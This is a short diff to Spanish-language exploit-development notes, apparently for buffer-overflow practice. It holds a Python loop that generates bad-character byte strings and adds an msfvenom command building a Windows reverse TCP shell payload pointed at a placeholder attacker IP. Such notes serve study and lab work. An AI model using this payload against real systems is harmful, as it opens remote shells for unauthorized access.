@@ -78,11 +78,16 @@ except:
 
 ```
 
-
 Generar cadena de carácteres incorrectos con Pyhon:
 
 ```
 for x in range(1, 256):
   print("\\x" + "{:02x}".format(x), end='')
 print()
+```
+
+## Generar carga útil
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c 
 ```
